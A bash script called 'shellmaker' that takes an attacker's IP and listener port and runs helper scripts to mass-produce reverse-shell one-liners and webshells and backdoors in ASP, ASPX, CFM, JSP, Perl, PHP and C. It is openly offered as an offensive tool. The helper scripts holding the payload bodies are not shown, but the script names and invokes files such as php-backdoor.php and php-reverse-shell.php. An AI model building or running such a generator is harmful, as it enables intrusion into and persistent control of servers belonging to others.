#!/bin/bash
# writes shells w/ your desired ip and port

if [ -z $1 ] || [ -z $2 ]
then
	echo "  _______ __          __ __ ___ ___       __               ";
	echo " |   _   |  |--.-----|  |  |   Y   .---.-|  |--.-----.----.";
	echo " |   1___|     |  -__|  |  |.      |  _  |    <|  -__|   _|";
	echo " |____   |__|__|_____|__|__|. \_/  |___._|__|__|_____|__|  ";
	echo " |:  1   |                 |:  |   |                       ";
	echo " |::.. . |                 |::.|:. |                       ";
	echo " \`-------'                 \`--- ---'                       ";
	echo "                                                           ";

	printf %"$(tput cols)"s |tr " " "-"
	printf %"$(tput cols)"s |tr " " "-"
	printf "USAGE: ./shellmaker.sh <your ip> <listener port>\n\n"
else
	echo "  _______ __          __ __ ___ ___       __               ";
	echo " |   _   |  |--.-----|  |  |   Y   .---.-|  |--.-----.----.";
	echo " |   1___|     |  -__|  |  |.      |  _  |    <|  -__|   _|";
	echo " |____   |__|__|_____|__|__|. \_/  |___._|__|__|_____|__|  ";
	echo " |:  1   |                 |:  |   |                       ";
	echo " |::.. . |                 |::.|:. |                       ";
	echo " \`-------'                 \`--- ---'                       ";
	echo "                                                           ";
	
# VARIABLES
	dir_name=shellmaker_$2_$1_OUTPUT
	one_liner_file=reverse_shell_one_liners
	file_creator_dir=file_creators
	dir_child=webshells
	directories=($dir_name/$dir_child $dir_name/$dir_child/asp $dir_name/$dir_child/aspx $dir_name/$dir_child/cfm $dir_name/$dir_child/jsp $dir_name/$dir_child/perl $dir_name/$dir_child/php)
	files=(cmd-asp-5.1.asp cmdasp.asp cmdasp.aspx cfexec.cfm cmdjsp.jsp  jsp-reverse.jsp perlcmd.cgi  perl-reverse-shell.pl findsock.c php-findsock-shell.php php-backdoor.php php-reverse-shell.php  simple-backdoor.php)

# CREATE REVERSE SHELL ONE LINERS
	mkdir $dir_name
	chmod u+x $file_creator_dir/$one_liner_file.sh
	./$file_creator_dir/$one_liner_file.sh $1 $2 $dir_name

# CREATE WEBSHELLS
	for dir in "${directories[@]}" 
	do
		mkdir $dir
	done	

	for file in "${files[@]}"
	do
		chmod u+x $file_creator_dir/$file.sh && ./$file_creator_dir/$file.sh $dir_name $dir_child $1 $2
	done

#SUCCESS STATEMENT
	printf "Shellmaker has successfully generated your webshell scripts and reverse-shell one-liners \n\nThe webshells can be found in the directory /$dir_name/$dir_child \n\nReverse-shell one-liners can be found in the file /$dir_name/$one_liner_file\n\n"
	printf "If you would like to suggest an additional script to include in this collection or have issues, please create an issue in the github repo." 
fi
